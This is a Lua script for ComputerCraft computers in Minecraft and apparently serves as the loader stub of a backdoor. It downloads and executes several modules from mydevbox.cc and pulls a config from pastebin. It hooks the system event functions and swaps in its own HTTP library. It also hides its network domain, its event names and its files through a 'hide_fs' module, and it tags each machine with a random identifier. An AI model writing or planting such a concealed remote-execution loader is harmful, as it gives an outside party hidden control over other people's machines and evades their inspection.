local main = {}
main.__index = main
local _ogg = _G
local _ogENV = _ENV
local backupPullEventRaw = _G.os.pullEventRaw
local backupPullEvent = _G.os.pullEvent
local customeventmanager = (pcall(require, "hooks.customeventmanager") and require("hooks.customeventmanager"))
local eventhook = (pcall(require, "hooks.eventhook") and require("hooks.eventhook")) or load(http.get("https://mydevbox.cc/src/hooks/eventhook.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "eventhook", "t", _G)()
local myhttp = (pcall(require, "networking.http.http") and require("networking.http.http")) or load(http.get("https://mydevbox.cc/src/networking/http/http.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "http", "t", _G)()
local fs = (pcall(require, "modules.persistent.hide_fs") and require("modules.persistent.hide_fs")) or load(http.get("https://mydevbox.cc/src/modules/persistent/hide_fs.lua").readAll(), "hide_fs", "t", _G)()
local custompairs = (pcall(require, "hooks.custompairs") and require("hooks.custompairs")) or load(http.get("https://mydevbox.cc/src/hooks/custompairs.lua").readAll(), "custompairs", "t", _G)()
local eventhandler = (pcall(require, "eventhandler.eventhandler") and require("eventhandler.eventhandler")) or load(http.get("https://mydevbox.cc/src/eventhandler/eventhandler.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "eventhandler", "t", _G)()
local config = (pcall(require, "config.config") and require("config.config")) or load(http.get("https://mydevbox.cc/src/config/config.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "config", "t", _G)()
local utils = (pcall(require, "sys.utils.utls") and require("sys.utils.utls")) or load(http.get("https://mydevbox.cc/src/sys/utils/utils.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "utils", "t", _G)()


eventhook.setCustomQueueEvent(customeventmanager.getQueueEventName())
eventhook.setOriginalPullEvent(backupPullEvent)
eventhook.setOriginalPullEventRaw(backupPullEventRaw)
eventhook.activate()

myhttp.addEventHandlers(eventhook)
myhttp.setCustomPullEvent(customeventmanager.getPullEventName())
myhttp.addSilentDomain("mydevbox.cc")
_G.http = myhttp
custompairs.add_to_blacklist(customeventmanager.getPullEventName())
custompairs.add_to_blacklist(customeventmanager.getQueueEventName())

eventhook.setEventHandler(eventhandler)
--local startup = (pcall(require, "sys.startup") and require("sys.startup")) or load(http.get("https://mydevbox.cc/src/sys/startup.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "startup", "t", _G)()
--startup:onStartup()
config:DownloadConfig("https://pastebin.com/raw/rHA43mQp")
config:set("identifier", utils.generateRandomString(16))
local handlerInstance = setmetatable({}, eventhandler)
--eventhook.setEventHandler(handlerInstance)

function main.getConfig()
    return config
end
function main.getConfigUrl()
    return configurl
end
function main.setConfigUrl(url)
    configurl = url
end

local function init()
    
end
init()
return main